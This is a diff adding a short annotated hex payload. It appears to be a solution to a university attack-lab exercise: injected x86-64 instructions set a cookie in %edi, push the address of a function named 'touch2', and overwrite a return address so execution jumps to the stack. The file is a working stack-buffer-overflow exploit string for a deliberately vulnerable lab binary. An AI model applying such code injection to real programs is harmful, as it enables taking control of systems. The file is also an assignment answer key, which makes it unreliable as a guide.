@@ -1,0 +1,7 @@
+bf fa 97 b9 59           /* mov  $0x59b997fa, %edi */
+48 83 ec 10              /* sub  $0x10, %rsp       */
+48 c7 04 24 ec 17 40 00  /* movq $0x4017ec, (%rsp) */
+c3 c3 c3 c3 c3 c3 c3     /* useless spacing */
+c3 c3 c3 c3 c3 c3 c3 c3  /* useless spacing */
+ec 17 40 00 00 00 00 00  /* jump to function touch 2 */
+78 dc 61 55 00 00 00 00  /* jump to stack addr 0x5561dc78 */
